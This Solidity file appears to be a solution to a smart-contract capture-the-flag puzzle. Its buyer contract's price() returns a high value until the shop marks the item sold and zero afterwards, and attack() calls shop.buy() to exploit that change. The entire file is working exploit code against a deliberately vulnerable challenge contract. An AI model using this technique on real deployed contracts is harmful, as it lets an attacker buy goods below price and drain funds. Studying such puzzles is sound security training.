// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract Shop {
    bool public isSold;

    function buy() external virtual;

    /*function isSold() external returns (bool);*/
}

contract MyBuyer1 {
    uint256 public firstprice;
    uint256 public secondprice;
    address payable owner;
    Shop public shop;

    constructor(address _address) public {
        owner = msg.sender;
        firstprice = 101;
        shop = Shop(_address);
        secondprice = 0;
    }

    function attack() public {
        shop.buy();
    }

    function kill() public {
        selfdestruct(owner);
    }

    function price() public view returns (uint256) {
        if (!shop.isSold()) return firstprice;
        else return secondprice;
    }
}